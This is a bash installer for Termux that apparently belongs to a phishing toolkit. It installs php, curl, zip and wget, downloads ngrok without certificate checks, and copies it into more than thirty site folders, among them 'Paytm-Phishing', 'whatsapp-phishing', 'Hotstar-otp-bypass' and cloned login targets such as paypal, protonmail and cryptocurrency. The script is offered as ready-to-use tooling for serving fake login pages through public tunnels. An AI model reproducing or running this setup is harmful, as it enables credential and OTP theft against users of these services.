#!/bin/bash
sleep 2
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'


command -v wget php curl zip > /dev/null 2>&1 &

if [[ -e /data/data/com.termux/files/usr/bin/php ]]; then
echo
else
apt install php -y
fi

if [[ -e /data/data/com.termux/files/usr/bin/curl ]]; then
echo
else
apt install curl -y
fi

if [[ -e /data/data/com.termux/files/usr/bin/zip ]]; then
echo
else
apt install zip -y
fi

if [[ -e /data/data/com.termux/files/usr/bin/wget ]]; then
echo
else
pkg install wget -y
fi

clear

echo

if [[ -e ngrok ]]; then
echo
else
wget --no-check-certificate https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip
sleep 2
unzip ngrok-2.2.8-linux-arm.zip 
sleep 2
chmod +x ngrok
sleep 2
rm -rf ngrok-2.2.8-linux-arm-zip 
fi

echo
cp -R ngrok sites/github/
cp -R ngrok sites/Hotstar-otp-bypass/
cp -R ngrok sites/instagram/
cp -R ngrok sites/Linkedin/
cp -R ngrok sites/Netflix/
cp -R ngrok sites/Paytm-Phishing/paytm/
cp -R ngrok sites/Paytm-Phishing/signup/
cp -R ngrok sites/spotify/
cp -R ngrok sites/whatsapp-phishing/
cp -R ngrok sites/facebook/
cp -R ngrok sites/google-otp/
cp -R ngrok sites/instafollow/
cp -R ngrok sites/ipfinder/
cp -R ngrok sites/ola-otpbypass/
cp -R ngrok sites/UberEats-Phishing/
cp -R ngrok sites/Zomato-Phishing/
cp -R ngrok sites/amazonsign/
cp -R ngrok sites/tiktok/
cp -R ngrok sites/phonepay/
cp -R ngrok sites/paypal/
cp -R ngrok sites/telegram/
cp -R ngrok sites/twitter/
cp -R ngrok sites/flipcart/
cp -R ngrok sites/wordpress/
cp -R ngrok sites/snapchat/
cp -R ngrok sites/protonmail/
cp -R ngrok sites/stackoverflow/
cp -R ngrok sites/ebay/
cp -R ngrok sites/twitch/
cp -R ngrok sites/ajio/
cp -R ngrok sites/cryptocurrency/
cp -R ngrok sites/mobikwik/
cp -R ngrok sites/pinterest/

echo

chmod 777 anadv.sh

clear
